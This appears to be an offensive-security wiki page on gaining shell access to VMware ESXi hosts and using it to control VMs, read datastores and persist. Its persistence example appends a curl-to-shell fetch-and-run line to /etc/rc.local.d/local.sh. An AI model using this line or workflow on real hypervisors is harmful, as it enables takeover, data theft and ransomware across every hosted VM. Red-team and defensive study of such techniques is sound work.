---
title: "Host access and shell: execution on the ESXi host"
order: 1
description: "Beyond a guest escape, an ESXi host is reached through its management surface: the authenticated host API and shell, SSH where enabled, and the SLP/CIM and vmx authd services. With host credentials or a management flaw, an attacker gets a vmkernel shell, from which they control every VM, read datastores, and establish persistence on the hypervisor itself."
keywords:
  - esxi shell
  - esxcli
  - ssh
  - slp cim
  - vmkernel
---

# Host access and shell

A guest escape is one way onto the host; the other is the ESXi management surface. ESXi exposes an authenticated host API and client over HTTPS, an ESXi Shell and SSH (often disabled but frequently re-enabled), and the SLP/CIM and `vmx` authentication (902) services. With host credentials, a management-service flaw, or re-enabled SSH, an attacker obtains a shell in the vmkernel environment, which is full control of the hypervisor: starting and stopping VMs, reading and modifying datastores, injecting into guests, and persisting on the host.

## Reach a shell

```bash
# SSH, if enabled (or enable it via the API/DCUI with host creds)
ssh root@<esxi-host>
# the ESXi shell gives esxcli and direct vmkernel access
esxcli vm process list                       # running VMs and their worlds
esxcli storage filesystem list               # datastores
vim-cmd vmsvc/getallvms                       # inventory via the management CLI
# the host API over HTTPS (vSphere API / host client) performs the same with creds
```

## What host access gives

```bash
# control every VM
vim-cmd vmsvc/power.off <vmid>; vim-cmd vmsvc/snapshot.create <vmid>
# read any VM's disk from the datastore (see datastore theft)
ls /vmfs/volumes/*/
# run commands inside a guest via VMware Tools (guest operations), with guest creds
vim-cmd vmsvc/guestop ...
# persist on the host: startup scripts in /etc/rc.local.d/local.sh survive reboot
echo '/bin/sh -c "curl http://a/c | sh" &' >> /etc/rc.local.d/local.sh
```

## Exploitation notes

- Re-enabling SSH or the ESXi Shell needs host admin via the API or DCUI; with host credentials this is the quickest route to an interactive shell.
- The SLP/CIM (427) and authd (902) services have been the entry point for pre-auth host compromises in the past; an unpatched, internet- or management-network-exposed ESXi is a direct target, and these have driven mass ransomware against ESXi fleets.
- `/etc/rc.local.d/local.sh` and the local bootbank are the host persistence locations that survive reboot; the vmkernel filesystem is otherwise largely in-memory.
- Host access subsumes datastore theft and guest control; once on the host, use [Datastore and VMDK theft](datastore-and-vmdk-theft.md) for offline data and the guest-operations API to run inside VMs.

## References

- [VMware: ESXi shell and SSH access](https://docs.vmware.com/en/VMware-vSphere/index.html)
- [VMware security advisories (SLP/CIM)](https://www.vmware.com/security/advisories.html)
- [esxcli reference](https://developer.vmware.com/tool/esxcli)
